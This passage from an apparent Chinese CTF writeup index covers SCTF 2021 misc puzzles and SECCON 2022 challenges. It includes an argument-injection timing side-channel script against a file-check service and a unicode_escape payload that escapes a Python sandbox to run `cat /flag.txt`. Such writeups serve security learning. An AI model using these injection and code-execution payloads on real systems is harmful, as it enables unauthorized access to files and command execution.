'001001', '\u8e47': '001010', '\u6e10': '001011', \n    '\u5c0f\u8fc7': '001100', '\u65c5': '001101', '\u54b8': '001110', '\u9041': '001111', \n    '\u5e08': '010000', '\u8499': '010001', '\u574e': '010010', '\u6da3': '010011', \n    '\u89e3': '010100', '\u672a\u6d4e': '010101', '\u56f0': '010110', '\u8bbc': '010111', \n    '\u5347': '011000', '\u86ca': '011001', '\u4e95': '011010', '\u5dfd': '011011', \n    '\u6052': '011100', '\u9f0e': '011101', '\u5927\u8fc7': '011110', '\u59e4': '011111', \n    '\u590d': '100000', '\u9890': '100001', '\u5c6f': '100010', '\u76ca': '100011', \n    '\u9707': '100100', '\u566c\u55d1': '100101', '\u968f': '100110', '\u65e0\u5984': '100111', \n    '\u660e\u5937': '101000', '\u8d32': '101001', '\u65e2\u6d4e': '101010', '\u5bb6\u4eba': '101011', \n    '\u4e30': '101100', '\u79bb': '101101', '\u9769': '101110', '\u540c\u4eba': '101111', \n    '\u4e34': '110000', '\u635f': '110001', '\u8282': '110010', '\u4e2d\u5b5a': '110011', \n    '\u5f52\u59b9': '110100', '\u777d': '110101', '\u5151': '110110', '\u5c65': '110111', \n    '\u6cf0': '111000', '\u5927\u755c': '111001', '\u9700': '111010', '\u5c0f\u755c': '111011', \n    '\u5927\u58ee': '111100', '\u5927\u6709': '111101', '\u592c': '111110', '\u4e7e': '111111'\n}\nindex = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b'.split(' ')\ns = ''.join([b64table[int(table[i], base=2)] for i in index])\n\nprint(b64decode(s + '='))\n# b'Ch1nA_yyds!'\n</code></pre>"}, {"location": "writeups/sctf2021/#fumo_xor_cli", "title": "fumo_xor_cli", "text": "<p>\u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9</p> <p>\u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6</p> <p>\u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a</p> <p></p> <p>\u5f97\u5230\uff1ahttps://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA </p> <p>\u627e\u5230\u56fe\u7247\uff1ahttps://imgtu.com/i/TpMSkq </p> <p></p> <p>\u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a</p> <pre><code>from PIL import Image \n\nimg = Image.open(\"TpMSkq.png\")\nres = Image.new(\"RGBA\", (101, 134))\nwidth, height = img.size \nprint(width, height)\n\nprint(img.getpixel((800, 1000)))\n\nfor i in range(width):\n    for j in range(height):\n        if i % 9 == 1 and j % 9 == 1:\n            pix = img.getpixel((i, j))\n            res.putpixel((i // 9, j // 9), pix)\n\nres.save(\"in_pix.png\")\n</code></pre> <p></p> <p>CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt \u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a</p> <pre><code>from PIL import Image \nimport re\n\nimg = Image.new(\"RGBA\", (101, 134))\npattern = re.compile(r'\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.')\n\nwith open(\"fumo_a.txt\", \"r\") as f:\n    for i in range(50):\n        line = f.readline().strip()\n        res = pattern.findall(line)\n        for j in range(133):\n            img.putpixel((i+50, j), tuple(int(res[j][k]) for k in range(3)))\n\nwith open(\"fumo_9.txt\", \"r\") as f:\n    for i in range(50):\n        line = f.readline().strip()\n        res = pattern.findall(line)\n        for j in range(133):\n            img.putpixel((i, j), tuple(int(res[j][k]) for k in range(3)))\n\nimg.save(\"cli.png\")\n</code></pre> <p>\u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a</p> <p></p> <p>\u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a<code>SCTF{Good_FuMo_CTF_OvO}</code></p>"}, {"location": "writeups/sctf2021/#in_the_vaporwaves", "title": "in_the_vaporwaves", "text": "<p>\u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a</p> <p></p> <p>\u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927</p> <p>wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a</p> <pre><code>import wave\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nwav = wave.open(\"c.wav\", \"r\")\nnframes = wav.getnframes()\nframerate = wav.getframerate()\ndata = wav.readframes(nframes)\nwav.close()\nwave_data = np.fromstring(data, dtype=np.short)\nwave_data.shape = -1, 2\nwave_data = wave_data.T\ntime = np.arange(0, nframes) * (1.0 / framerate)\n\nres = wave_data[0] + wave_data[1]\n\nplt.figure()\n# plt.plot(time, res)\nplt.plot(time[87*framerate:128*framerate], res[87*framerate:128*framerate])\nplt.show()\n</code></pre> <p></p> <p></p> <p>\u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag</p> <pre><code>... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ...\n</code></pre> <p>SCTFDES1R3_DRIVES_INT0_VAPORW@VES</p> <p>flag: <code>SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}</code></p>"}, {"location": "writeups/seccon2022/", "title": "SECCON CTF 2022 Quals Writeup", "text": "<p> \u7ea6 1720 \u4e2a\u5b57  111 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u9694\u4e86\u51e0\u5e74\u540e\u7b2c\u4e00\u6b21\u6709\u65e5\u672c\u7ebf\u4e0b\u51b3\u8d5b\u7684 SECCON\uff0c\u961f\u91cc\u51b3\u5b9a\u597d\u597d\u6253\u4e00\u4e0b\uff0c\u9884\u9009\u8d5b 24 \u5c0f\u65f6\uff0c\u6700\u540e\u52c9\u5f3a\u538b\u7ebf\u8fdb\u4e86\u51b3\u8d5b\u3002</p> <p>misc \u9898\u6bd4\u8f83\u5750\u7262\uff0c\u5927\u6982\u5c31\u662f\u6e90\u7801\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u5c31\u662f\u5f88\u96be\u60f3\u51fa\u6765\u505a\u6cd5\u3002\u800c\u4e14\u6709\u90a3\u4e48\u4e00\u4e1d hackergame \u7684\u5473\u9053\u3002</p> <p>\u5728\u961f\u53cb\u5e2e\u52a9\u4e0b\u8fd8\u662f\u5dee\u4e86\u4e00\u9053 AK\uff0c\u4e0d\u8fc7\u90a3\u4e00\u9053\u540e\u6765\u5728 discord \u770b\u5230\u4e86\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5176\u5b9e\u89e3\u6cd5\u4e5f\u4e0d\u96be\u7684\uff0c\u53ef\u60dc\u4e86\u2026\u2026</p> <p>noiseccon \u90a3\u9898\u6211\u57fa\u672c\u6ca1\u53c2\u4e0e\uff0c\u6ca1\u7ec6\u770b\uff0c\u5c31\u4e0d\u5199\u4e86\u3002</p>"}, {"location": "writeups/seccon2022/#find-flag", "title": "find flag", "text": "\u9898\u76ee\u6e90\u7801 <pre><code>#!/usr/bin/env python3.9\nimport os\n\nFLAG = os.getenv(\"FLAG\", \"FAKECON{*** REDUCTED ***}\").encode()\n\ndef check():\n    try:\n        filename = input(\"filename: \")\n        if open(filename, \"rb\").read(len(FLAG)) == FLAG:\n            return True\n    except FileNotFoundError:\n        print(\"[-] missing\")\n    except IsADirectoryError:\n        print(\"[-] seems wrong\")\n    except PermissionError:\n        print(\"[-] not mine\")\n    except OSError:\n        print(\"[-] hurting my eyes\")\n    except KeyboardInterrupt:\n        print(\"[-] gone\")\n    return False\n\nif __name__ == '__main__':\n    try:\n        check = check()\n    except:\n        print(\"[-] something went wrong\")\n        exit(1)\n    finally:\n        if check:\n            print(\"[+] congrats!\")\n            print(FLAG.decode())\n</code></pre> <p>\u6e90\u7801\u4e0d\u957f\uff0c\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5b83\u4f1a\u8bfb\u53d6\uff0c\u5982\u679c\u5f00\u5934\u5c31\u662f flag\uff0c\u90a3\u4e48\u5c31\u8f93\u51fa flag\u3002</p> <p>\u521a\u5f00\u59cb\u7684\u65f6\u5019\u6211\u4eec\u5c31\u4ee5\u4e3a\u662f\u8981\u627e\u8fd9\u6837\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u6d4b\u8bd5\u4e86\u597d\u591a\uff0c\u53cd\u6b63\u662f /proc/1/environ \u548c /proc/self/environ \u91cc\u662f\u6709 flag \u7684\uff0c\u4f46\u662f\u5b83\u4e0d\u5728\u5f00\u5934\u3002\u6240\u4ee5\u60f3\u8981\u627e\u529e\u6cd5\u8ba9 open \u8bfb\u53d6\u7684\u65f6\u5019\u81ea\u5e26\u504f\u79fb\u3002\u7ffb\u4e86\u6e90\u7801\u4e5f\u641e\u4e0d\u61c2\u3002</p> <p>\u7136\u540e\u662f\u5728\u4e00\u6b21\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u7684\u989d\u5916\u547d\u4ee4\u5076\u7136\u89e6\u53d1\u4e86\u7f16\u7801\u9519\u8bef\uff0c\u4f46\u662f\u5374\u5f39\u51fa\u4e86 flag\uff0c\u540c\u65f6\u9644\u5e26\u7684\u8fd8\u6709 \"[-] something went wrong\"\u3002</p> <p>\u8fd9\u624d\u60f3\u8d77\u6765 python \u7684 try-except-finally \u8bed\u53e5\u662f\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u6267\u884c finally\uff0c\u800c\u4e14\u5982\u679c check \u51fd\u6570\u4e2d\u95f4\u4ea7\u751f\u4e86\u5176\u5b83\u6ca1\u6709\u88ab\u6355\u83b7\u7684\u5f02\u5e38\u7684\u8bdd\u5c31\u4f1a\u9000\u51fa\uff0c\u7136\u540e\u8fd9\u4e2a\u5f02\u5e38\u88ab main \u91cc\u7684 except \u6355\u83b7\u3002\u867d\u7136 exit(1) \u4e86\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u9000\u51fa\u7a0b\u5e8f\uff0c\u800c\u662f\u4f1a\u8fdb\u5165\u5230 finally \u5757\u4e2d\u3002\u800c\u4e14\u6b64\u65f6\u7531\u4e8e check \u51fd\u6570\u88ab\u4e2d\u65ad\u4e86\uff0c\u6240\u4ee5 check \u53d8\u91cf\u540d\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\uff0c\u5b83\u4fdd\u7559\u7684\u4ecd\u7136\u662f\u8fd9\u4e2a\u51fd\u6570\uff0c\u6240\u4ee5 if check \u81ea\u7136\u5c31\u6210\u7acb\u4e86\u3002</p> <p>\u6240\u4ee5\u8fd9\u662f\u4e00\u9053\u7eaf\u7684 python \u8bed\u8a00\u7279\u6027\u9898\uff0c\u6700\u7ec8\u76ee\u6807\u5c31\u662f\u8981\u5728 check \u51fd\u6570\u7684 try \u5757\u4e2d\u89e6\u53d1\u9664\u4e86 FileNotFoundError\u3001IsADirectoryError\u3001PermissionError\u3001OSError\u3001KeyboardInterrupt \u4e4b\u5916\u7684\u5f02\u5e38\u3002\u53ef\u4ee5\u76f4\u63a5\u5728\u8f93\u5165\u7684\u65f6\u5019\u6309\u4e0b Ctrl-D\uff0c\u8fd9\u4f1a\u53d1\u9001\u4e00\u4e2a EOF\uff0c\u9020\u6210 input \u7684 EOFError\uff1b\u4e5f\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a \\x00\\n \u4e4b\u7c7b\u7684\uff0c\u8ba9 open \u51fd\u6570\u629b\u51fa ValueError\u3002\u7136\u540e\u5c31\u4f1a\u4f9d\u6b21\u8fdb\u5165 except \u548c finally \u5757\u5e76\u8f93\u51fa flag \u4e86\u3002</p> <p>flag: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}</p>"}, {"location": "writeups/seccon2022/#txtchecker", "title": "txtchecker", "text": "<p>\u5f88\u5750\u7262\u4f46\u5f88\u6709\u610f\u601d\u7684\u4e00\u9053\u9898\u3002\u9898\u76ee\u4ee3\u7801\u4e3b\u4f53\u5c31\u53ea\u6709\uff1a <pre><code>#!/bin/bash\nread -p \"Input a file path: \" filepath\nfile $filepath 2&gt;/dev/null | grep -q \"ASCII text\" 2&gt;/dev/null\nexit 0\n</code></pre> \u4f1a\u901a\u8fc7 ssh ForceCommand \u5f3a\u5236\u6bcf\u6b21\u8fde\u63a5\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002flag \u5b58\u653e\u5728 /flag.txt \u4e2d\u3002</p> <p>\u8fd9\u4e2a\u811a\u672c\u53ef\u63a7\u7684\u53ea\u6709 file \u547d\u4ee4\u7684\u53c2\u6570\uff0c\u800c\u4e14\u5176 stdin \u4f1a\u901a\u8fc7\u7ba1\u9053\u4f20\u7ed9\u540e\u9762\u7684 grep\uff0cgrep \u4f7f\u7528\u4e86 -q \u4e5f\u5c31\u662f --quiet\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002\u800c\u4e14\u4e24\u6761\u6307\u4ee4\u7684 stderr \u90fd\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u9ed1\u6d1e\u4e2d\u3002\u5e76\u4e14\u4e0d\u8bba\u7ed3\u679c\u5982\u4f55\u90fd\u4f1a exit 0\u3002\u6240\u4ee5\u5c31\u662f\u4e00\u4e2a\u65e0\u4efb\u4f55\u56de\u663e\u3001\u65e0\u8fd4\u56de\u503c\u7684\u811a\u672c\u3002</p> <p>\u6240\u4ee5\u601d\u8def\u4e5f\u5c31\u53ea\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u7ed5\u8fc7\uff0c\u7136\u540e getshell\uff0c\u4f46\u662f\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u592a\u53ef\u884c\uff0c\u800c\u4e14\u6240\u6709\u961f\u4f0d\u90fd\u8fde\u63a5\u540c\u4e00\u4e2a\u673a\u5668\uff0c\u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\u6050\u6015\u65e9\u5c31\u88ab\u6253\u70c2\u4e86\u3002\u53e6\u4e00\u4e2a\u601d\u8def\u5c31\u662f\u4fa7\u4fe1\u9053\u3002</p> <p>\u7ffb\u4e86 file \u7684 man page\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a -m \u53c2\u6570\u53ef\u4ee5\u6307\u5b9a magic \u6587\u4ef6\uff0c\u8fd9\u4e2a magic \u6587\u4ef6\u662f\u7528\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u7684\uff0c\u5b83\u4e5f\u6709 man page\uff0c\u91cc\u9762\u6709\u76f8\u5173\u7684\u683c\u5f0f\u3002\u9664\u6b64\u4e4b\u5916\u4e5f\u641c\u5230\u4e86 file \u6e90\u7801\u4e2d\u7684\u81ea\u5e26 magic file \u4ee5\u53ca\u4e00\u4e2a\u7b2c\u4e09\u65b9 magic file \u7684 repo  lindenb/magic\u3002</p> <p>-m \u53c2\u6570\u53ea\u80fd\u6307\u5b9a magic file \u6587\u4ef6\uff0c\u800c\u6211\u4eec\u60f3\u8981\u7684\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u670d\u52a1\u5668\u4e0a\u7684\u3002\u6240\u4ee5\u8981\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\uff0c\u8bd5\u4e86\u4e00\u4e0b -m /dev/stdin \u662f\u53ef\u4ee5\u7684\uff0c\u6bd4\u5982\u8f93\u5165 <code>/flag -m /dev/stdin</code>\uff0c\u7136\u540e\u5c31\u4f1a\u8981\u6c42\u8f93\u5165 magic file \u5185\u5bb9\uff0c\u7528 Ctrl-D \u7ed3\u675f\u3002\u6309\u7167\u4e0a\u9762\u7684\u4e00\u4e9b\u683c\u5f0f\uff0c\u5c1d\u8bd5\u4f7f\u7528\u6700\u65b9\u4fbf\u7684 regex\uff0c\u672c\u5730\u8c03\u8bd5\uff1a <pre><code>$ echo \"/flag.txt -m /dev/stdin\\n0 regex .* flag\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022\nPseudo-terminal will not be allocated because stdin is not a terminal.\nctf@localhost's password:\n/flag.txt: flag, ASCII text\n$ echo \"/flag.txt -m /dev/stdin\\n0 regex .* %s\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022\nPseudo-terminal will not be allocated because stdin is not a terminal.\nctf@localhost's password:\n/flag.txt: SECCON{dummy}, ASCII text\n</code></pre> \u6240\u4ee5\u5176\u5b9e\u5982\u679c\u6709\u56de\u663e\u7684\u8bdd\u5c31\u80fd\u76f4\u63a5\u6cc4\u9732\u51fa flag \u4e86\u3002\u4f46\u662f\u73b0\u5728\u8fd9\u6837\u53ea\u80fd\u901a\u8fc7\u4fa7\u4fe1\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u65f6\u95f4\u957f\u77ed\u6765\u5224\u522b\u3002\u65e2\u7136\u662f\u901a\u8fc7\u6b63\u5219\u5339\u914d\uff0c\u90a3\u4e48\u6211\u4eec\u7406\u8bba\u5c31\u53ef\u4ee5\u901a\u8fc7\u8ba9\u5339\u914d\u548c\u4e0d\u5339\u914d\u65f6\u95f4\u4ea7\u751f\u5dee\u522b\uff0c\u7136\u540e\u9010\u5b57\u7b26 leak \u51fa flag\u3002</p> <p>\u7136\u540e\u5c31\u641c\u4e86\u641c ReDoS\uff0c\u770b\u4e0d\u592a\u61c2\uff08\u4e4b\u540e\u6709\u65f6\u95f4\u8865\u4e00\u8865\uff09\uff0c\u4f46\u662f\u611f\u89c9\u5728\u8fd9\u91cc\u90fd\u4e0d\u592a\u53ef\u7528\uff0c\u7136\u540e\u56db\u8001\u5e08\u7ed9\u4e86\u4e00\u4e2a <code>(.?){0, 1000}</code> \u8fd9\u4e2a\u6b63\u5219\u662f\u53ef\u4ee5\u5361\u4f4f\u7684\u3002</p> <p>\u518d\u770b magic \u7684\u683c\u5f0f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6587\u4ef6\u7c7b\u578b\u53ef\u4ee5\u6709\u591a\u6b21\u5339\u914d\uff0c\u5176\u5c42\u7ea7\u901a\u8fc7 &gt; \u6765\u8868\u793a\u3002\u4f8b\u5982\uff1a <pre><code>0 regex pattern1\n&gt;0x18 regex pattern2 type1\n&gt;0x18 regex pattern3 type2\n&gt;&gt;0x...\n</code></pre> \u5176\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6811\u72b6\u7684\u7ed3\u6784\uff0c\u524d\u9762\u7684\u4e0d\u6210\u7acb\u7684\u8bdd\uff0c\u4e0b\u4e00\u5c42\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u5339\u914d\u3002\u6240\u4ee5\u53ef\u4ee5\u5728\u7b2c\u4e00\u5c42\u5224\u65ad\u662f\u5426\u5339\u914d flag\uff0c\u5728\u7b2c\u4e8c\u5c42\u901a\u8fc7\u524d\u9762\u7684\u6b63\u5219\u6765\u5361\u4f4f\uff0c\u8fd9\u6837\u5339\u914d\u4e0a\u7684\u8bdd\u65f6\u95f4\u5c31\u4f1a\u62d6\u6162\uff0c\u800c\u6bcf\u5339\u914d\u4e0a\u7684\u5c31\u4f1a\u8f83\u5feb\u4e00\u70b9\u3002\u6240\u4ee5\u8bbe\u8ba1\u7684 magic file payload \u5c31\u662f\uff1a <pre><code>0 regex SECCON\\\\{%s(.)+\\\\} aaa\n&gt;0 regex (.?){0, 1000} a\n</code></pre> \u7136\u540e\u5199\u4e00\u4e2a\u7a0b\u5e8f\u9010\u5b57\u7b26\u5c1d\u8bd5\uff0c\u7136\u540e\u53d6\u65f6\u95f4\u6700\u957f\u7684\u4e00\u4e2a\u586b\u5165 flag \u5e76\u7ee7\u7eed\uff0c\u5c31\u53ef\u4ee5\u4e00\u70b9\u4e00\u70b9 leak \u51fa flag\u3002</p> exp <pre><code>s = 'echo \"/flag.txt -m /dev/stdin\\n0 regex SECCON\\\\\\\\\\\\\\\\{%s(.)+\\\\\\\\\\\\\\\\} aaa\\n&gt;0 regex (.?){0,1000} a\" | sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022'\n\nimport os, time, string\nimport subprocess\n\nflag = \"\"\n\nfor rd in range(10):\n    res, best = None, None\n    for i in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_$\":\n        print(i, end = \" \")\n        st = time.time()\n        subprocess.run(s % (flag + i), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        t = time.time() - st\n        print(t)\n        if (res is None) or t &gt; best:\n            res = i\n            best = t\n    flag = flag + res\n    print(f\"SECCON{{{flag}\")\n</code></pre> <p>\u627e\u961f\u53cb\u8981\u4e86\u4e00\u4e2a\u65e5\u672c\u7684\u5ef6\u8fdf\u5c0f\u7684\u670d\u52a1\u5668\uff0c\u8dd1\u4e86\u4e00\u4e0b\uff0c\u5f97\u5230 flag: SECCON{reDo5L1fe}</p>"}, {"location": "writeups/seccon2022/#latexipy", "title": "latexipy", "text": "\u9898\u76ee\u4e3b\u4f53\u4ee3\u7801 <p><pre><code>import sys\nimport ast\nimport re\nimport tempfile\nfrom importlib import util\n\n\ndef get_fn_name(source: str) -&gt; str | None:\n    root = ast.parse(source)\n    if type(root) is not ast.Module:\n        return None\n    if len(root.body) != 1:\n        return None\n\n    fn = root.body[0]\n    if type(fn) is not ast.FunctionDef:\n        return None\n\n    fn.body.clear()\n    if not re.fullmatch(r\"def \\w+\\((\\w+(, \\w+)*)?\\):\", ast.unparse(fn)):\n        # You must define a function without decorators, type annotations, and so on.\n        return None\n\n    return str(fn.name)\n\n\nprint(\"\"\"\nLatexify as a Service!\n\nE.g.\n</code></pre> def solve(a, b, c):     return (-b + math.sqrt(b2 - 4ac)) / (2*a) <pre><code>ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb\n\nInput your function (the last line must start with __EOF__):\n\"\"\".strip(), flush=True)\n\nsource = \"\"\nwhile True:\n    line = sys.stdin.readline()\n    if line.startswith(\"__EOF__\"):\n        break\n    source += line\n\nname = get_fn_name(source)\nif name is None:\n    print(\"Invalid source\")\n    exit(1)\n\nsource += f\"\"\"\nimport latexify\n__builtins__[\"print\"](latexify.get_latex({name}))\n\"\"\"\n\nwith tempfile.NamedTemporaryFile(suffix=\".py\") as file:\n    file.write(source.encode())\n    file.flush()\n\n    print()\n    print(\"Result:\")\n    spec = util.spec_from_file_location(\"tmp\", file.name)\n    spec.loader.exec_module(util.module_from_spec(spec))\n</code></pre></p> <p>\u53cd\u6b63\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u51fd\u6570\uff08\u53ea\u80fd\u662f\u5355\u72ec\u4e00\u4e2a\u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u88c5\u9970\u5668\u3001\u7c7b\u578b\u6ce8\u89e3\u7b49\uff09\uff0c\u7136\u540e\u62fc\u63a5\u8d77\u6765\u5f97\u5230\u4e00\u4e2a\u4e34\u65f6\u4ee3\u7801\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u3002\u6548\u679c\u5c31\u662f\u5229\u7528 v0.1.1 \u7248\u672c\u7684 latexify \u6765\u8bb2\u8fd9\u4e2a\u51fd\u6570\u8f6c\u6362\u4e3a LaTeX \u8bed\u6cd5\u7684\u8868\u793a\u3002flag \u5728 /flag.txt\uff0c\u8981\u8bd5\u56fe\u8bfb\u53d6\u5b83\u3002</p> <p>\u7ffb\u4e86 latexify \u7684\u6e90\u7801\uff0cv0.1.1 \u7684\u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u5c31\u662f core.py \u4e00\u4e2a\u6587\u4ef6\u91cc\u904d\u5386\u4e86\u4e00\u904d ast \u6811\u3002\u6ca1\u6709\u4efb\u4f55 eval \u4e4b\u7c7b\u7684\u3001\u4e5f\u6ca1\u6709\u4efb\u4f55\u8c03\u7528\u90e8\u4ef6\u7684\u5730\u65b9\u3002\u9898\u76ee\u4e5f\u9650\u5236\u7684\u5f88\u6b7b\uff0c\u4e5f\u6ca1\u6709\u8c03\u7528\u7684\u5730\u65b9\u3002\u552f\u4e00\u53ef\u80fd\u5229\u7528\u7684\u662f\u63d0\u4f9b\u4e00\u4e2a print \u51fd\u6570\u8bd5\u56fe\u5728\u6253\u5370\u7ed3\u679c\u7684\u65f6\u5019\u8c03\u7528\uff0c\u4f46\u662f\u5b83\u53c8\u7528\u7684\u662f __builtins__[\"print\"] \u9632\u6b62\u4e86\u8fd9\u4e00\u884c\u4e3a\u3002</p> <p>\u60f3\u4e86\u5f88\u591a\u3001\u8bd5\u4e86\u5f88\u591a\u3001\u4e5f\u7ffb\u4e86\u6e90\u7801\uff0c\u6ca1\u505a\u51fa\u6765\u3002</p> <p>\u8d5b\u540e\u770b\u4e86 discord \u4e0a\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5f88\u7b80\u5355\uff0c\u6539\u4e86\u4e00\u4e0b\u5c31\u662f\uff1a <pre><code># coding: unicode_escape\ndef exp():\n    return \"\\u0022\\u000a__import__('os').system('cat /flag.txt')\\u000a\\u0022\"\n__EOF__\n</code></pre> \u8fd9\u4e2a\u539f\u7406\u4e5f\u5f88\u7b80\u5355\u3002\u5c31\u662f\u5728 get_fn_name \u8fdb\u884c\u68c0\u67e5\u7684\u65f6\u5019\u662f\u76f4\u63a5\u5bf9\u8f93\u5165\u8fdb\u884c ast \u89e3\u6790\u7136\u540e\u68c0\u67e5\u8bed\u6cd5\u6811\u7684\uff0c\u8fd9\u65f6\u6ce8\u91ca\u4f1a\u88ab\u5ffd\u7565\uff0creturn \u7684\u5b57\u7b26\u4e32\u662f\u5b8c\u6574\u7684\uff0c\u6240\u4ee5\u4e00\u5207\u68c0\u67e5\u90fd\u53ef\u4ee5\u901a\u8fc7\u3002</p> <p>\u800c\u5f53\u8fd0\u884c\u7684\u65f6\u5019\u662f\u5c06\u5176\u5199\u5165\u6587\u4ef6\u7136\u540e\u8fd0\u884c\u6587\u4ef6\u7684\u3002\u6211\u4eec\u7684\u8f93\u5165\u5728\u5f00\u5934\uff0c\u7b2c\u4e00\u884c\u7684\u6ce8\u91ca\u5c31\u6307\u5b9a\u4e86\u6587\u4ef6\u7f16\u7801\u4e3a unicode_escape\uff0c\u6240\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u89e3\u7801\u5f97\u5230\u7684\u5c31\u76f8\u5f53\u4e8e\uff1a <pre><code># coding: unicode_escape\ndef exp()\n    return \"\"\n__import__('os').system('cat /flag.txt')\n\"\"\nimport latexify\n__builtins__[\"print\"](latexify.get_latex({name}))\n</code></pre> \u6240\u4ee5\u5728\u6267\u884c\u7684\u65f6\u5019\u5c31\u4f1a cat flag \u4e86: SECCON{UTF7_is_hack3r_friend1y_encoding}</p>"}, {"location": "writeups/seccon2022final/", "title": "SECCON CTF 2022 Final Writeup", "text": "<p> \u7ea6 479 \u4e2a\u5b57  53 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u53c2\u52a0\u7684\u7b2c\u4e00\u6b21\u7ebf\u4e0b\u8d5b\uff0c\u5728\u65e5\u672c\uff0c\u73a9\u7684\u5f88\u5f00\u5fc3\uff0c\u9898\u4e5f\u90fd\u5f88\u6709\u610f\u601d\u3002</p> <p>\u4e0d\u8fc7 misc \u53ea\u6709\u4e00\u9053\u7269\u7406\u9898\uff0cweb \u6bd4\u8f83\u5750\u7262\u6211\u4e5f\u4e0d\u4f1a\uff0cKoH \u8fd8\u633a\u523a\u6fc0\u633a\u6709\u610f\u601d\u7684\u3002</p>"}, {"location": "writeups/seccon2022final/#sniffer", "title": "Sniffer", "text": "<p>\u4e00\u9053\u7269\u7406\u8bbe\u5907\u7684\u9898\uff0c\u4e0d\u96be\uff0c\u4f46\u5b9e\u64cd\u8fd8\u662f\u5f88\u6709\u610f\u601d\u7684\uff0c\u89e3\u9898\u9650\u65f6 50 